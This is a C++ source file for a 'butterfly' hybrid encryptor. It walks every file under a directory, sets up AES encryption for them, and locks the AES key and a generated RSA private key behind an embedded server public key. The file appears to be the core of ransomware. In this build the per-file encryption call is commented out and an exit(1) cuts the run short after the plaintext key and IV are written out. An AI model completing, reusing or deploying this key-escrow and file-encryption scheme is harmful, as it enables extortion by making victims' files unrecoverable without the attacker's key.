
#include "crypto/encryptor.h"

namespace butterfly
{

namespace hybrid
{

Encryptor::Encryptor(int keySize, const std::string &aesKeyDbFilepath) : _keySize(keySize),  _aesKeyDbFilepath(aesKeyDbFilepath),
                                                                         _rsaEncryptorAESKey(new rsa::RSAEncryptor(_keySize)),
                                                                         _rsaEncryptorCPrivateRSA(new rsa::RSAEncryptor(rsa::SPUBLIC_PEM)),
                                                                         _aesEncryptor(new aes::AESEncryptor()),
                                                                         _dirIterator(new DirectoryIterator()),
                                                                         _aesKeyDatabase(new AESKeyDatabase(_aesKeyDbFilepath))
{
    LOG_TRACE("Create class Encryptor");
}

Encryptor::~Encryptor()
{

}

void Encryptor::invokeDir(const std::string &path)
{
    // Encrypt the CPrivateRSA.pem file CPrivateRSA.bin
    encryptCPrivateRSA();

    // Get all files from provided directory path
    auto files =  _dirIterator->getAllFiles(path);

    // Generate the AES Key and IV
    if ( _aesEncryptor->generateAESKey() )
    {

        // If --protect is enabled
        std::string aeskey = _aesEncryptor->getAESKey();
        std::string aesiv = _aesEncryptor->getAESIv();
        //std::string aeskeyabc = "abc";
        //std::string aesivabc = "def";
        butterfly::writeBinFile("AESKey.txt", aeskey.c_str(), static_cast<long>(aeskey.length()));
        butterfly::writeBinFile("AESIV.txt", aesiv.c_str(), static_cast<long>(aesiv.length()));
        exit(1);
        for (auto &file: files)
        {
            LOG_TRACE("FILE: " << file);
            //encryptFileWithAES(file.string());
        }

        // Save the final AESKey.bin file
        encryptFinalAESKeyWithRSA(_aesEncryptor->getAESKey(), "AESKey.bin");
        // Save the final AESIV.bin file
        encryptFinalAESKeyWithRSA(_aesEncryptor->getAESIv(), "AESIV.bin");

    }

}

void Encryptor::encryptCPrivateRSA()
{
    // Get the CPrivateRSA.pem file string
    std::string cPrivateRSAStr = _rsaEncryptorAESKey->getRSAPrivateKeyStr();
    //writeBinFile("CPrivateRSA.pem", cPrivateRSAStr.c_str(), static_cast<long>(cPrivateRSAStr.length()));
    EVP_PKEY *cPrivateRSAPKey = _rsaEncryptorCPrivateRSA->getEvpPkey();

    try
    {
        // Encrypt the CPrivateRSA.pem file string
        _rsaEncryptorCPrivateRSA->encrypt(cPrivateRSAPKey, cPrivateRSAStr.substr(0, cPrivateRSAStr.size() - 1));
        // Get the encrypted CPrivateRSA.pem string
        std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedKey();
        // Save the encrypted CPrivateRSA string to CPrivateRSA.bin
        _rsaEncryptorCPrivateRSA->saveEncryptedKeyFile(butterfly::ENC_CPRIVATERSA_FILENAME, cPrivateRSAEnc,_rsaEncryptorCPrivateRSA->getEvpPkeySize(cPrivateRSAPKey));

    } catch (RSAEncryptionException &e)
    {
        LOG_ERROR(e.what());
    }

}

void Encryptor::encryptFileWithAES(const std::string &filepath)
{

    try
    {
        // Encrypt the file with AES
        _aesEncryptor->encryptFile(filepath);

    } catch (AESEncryptionException &e)
    {
        LOG_ERROR(e.what());
    }

}

void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyStr, const std::string &filename)
{

    try
    {
        // Encrypt the AES Key String
        _rsaEncryptorAESKey->encrypt(_rsaEncryptorAESKey->getEvpPkey(), aesKeyStr);
        // Get the encrypted AES Key String
        std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedKey();
        // Save the encrypted AES Key to AESKey.bin
        _rsaEncryptorAESKey->saveEncryptedKeyFile(filename, aesKeyEnc,_rsaEncryptorAESKey->getRSAKeySize());

    } catch (RSAEncryptionException &e)
    {
        LOG_ERROR(e.what());
    }

}

void Encryptor::encryptAESKeyFile(const std::string &filepath)
{
    std::string fileContent = butterfly::readBinFile(filepath);

    try
    {
        // encrypt the AES Key
        _rsaEncryptorAESKey->encrypt(_rsaEncryptorAESKey->getEvpPkey(), fileContent);
        // get the encrypted AES Key string
        std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedKey();
        // save the encrypted AES Key to AESKey.bin
        _rsaEncryptorAESKey->saveEncryptedKeyFile(filepath + ".bin", aesKeyEnc,_rsaEncryptorAESKey->getRSAKeySize());

    } catch (RSAEncryptionException &e)
    {
        LOG_ERROR(e.what());
    }
}

} // namespace hybrid

} // namespace butterfly
